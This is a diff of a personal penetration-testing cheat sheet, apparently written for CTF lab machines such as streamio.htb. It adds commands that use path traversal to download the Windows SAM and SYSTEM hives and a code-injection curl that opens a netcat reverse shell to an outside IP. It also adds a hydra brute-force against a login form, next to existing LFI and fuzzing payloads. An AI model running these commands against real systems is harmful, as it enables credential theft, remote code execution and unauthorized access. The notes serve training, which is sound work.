@@ -119,7 +119,6 @@ Try seeing if you can get the php source code:
 ```bash
 https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
 ```
-
 I ran into a page that said "Only accessable through includes". This is referring to a header, "include=", where you can include files and possibly execute code.
 
 WHENEVER YOU'RE SENDING A POST REQUEST, INCLUDE THE CONTEXT-TYPE HEADER, like 'Content-Type: application/x-www-form-urlencoded'.
@@ -134,6 +133,13 @@ include=reverse-shell.php
 When testing for a php reverse shell, you can make a simple php file that says "echo WAZZUP;" and check whether "WAZZUP" is returned in the response.
 
 If that doesn't work, you could have him connect back to us so that we could crack the hash.
+
+Check out the sam and system files:
+
+```bash
+wget http://192.168.33.165/..%5C..%5C..%5C..%5C..%5Cwindows..%5Csystem..%5Cconfig..%5Cregback..%5Csystem.old -O SYSTEM
+wget http://192.168.33.165/..%5C..%5C..%5C..%5C..%5Cwindows..%5Csystem..%5Cconfig..%5Cregback..%5Csam.old -O SAM
+```
 
 14. Stealing Session Cookies
 
@@ -357,6 +363,13 @@ If you need to be authorized/logged in:
 ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=k2285854j74rk51pctgl7kes34'
 ```
 
+If you run into an api, start testing with curl. If csrf is there, execute code.
+
+```bash
+curl -si --data "code=1+1" # {7*7}...
+curl http://192.168.195.117:50000/verify -si --data "code=os.system('nc -c bash 192.168.45.178 50000')"
+```
+
 #### Fuzzing Input Paramater
 
 Find the parameter in Burp to what you want to FUZZ, as well as the Content-Type in Request Headers.
@@ -373,7 +386,8 @@ hydra -l user -P pwdpath ip http-get
 # -I to override previous scan with updated list
 ```
 
+#### Hydra for Webapp Login Brute
 
-
-
-
+```bash
+hydra -L user.txt -P pass.txt 10.10.123.83 http-post-form "/Account/login.aspx:__VIEWSTATE=hRiqPHaIdHtHLPKokY59%2B3WUD9ZtsmFSLG55rJABKbT96KUnil6PSus2s75rJc8vTAE%2FEwshWpfpFAiJph7q2PzNZ37cCzPieJzYqs9QMUT947ZVfG7IbjK6qCzrjcKpMsqoov6Ux5RgPM9%2FW7IoWO8%2FXpP7Nbs7NS6xWBQr7s%2B1oUL%2B&__EVENTVALIDATION=fPja7KnrVpkm0bLBQSRGAe%2FmniIYroH63YCNKLdpLMgJN1lAWkehyJsp7MO1wKFsmMrrrm2IU594ajRCbyTN06CR2ew3apQGWSgeYHFacGYWD7509OV%2BqPO3wYCge9Jxl7MSgI%2Fny5yRTI30DifQFZDuopQAKaObXPbgfpYF3EA6UR8K&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+```
